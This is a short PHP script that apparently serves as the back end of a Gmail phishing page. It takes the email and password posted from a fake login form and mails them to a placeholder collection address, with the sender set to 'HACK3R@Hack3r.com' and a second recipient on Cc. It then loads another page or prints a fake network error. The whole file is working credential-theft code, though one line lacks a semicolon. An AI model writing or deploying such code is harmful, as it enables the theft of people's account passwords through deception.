<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
        $gmail = "MKR"
         $to = "yourmailaddress@gmail.com";
         $subject = "Workshop Gmail password $gmail";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:afgh@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         
         if( $retval == true ) {
            include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
         }
      ?>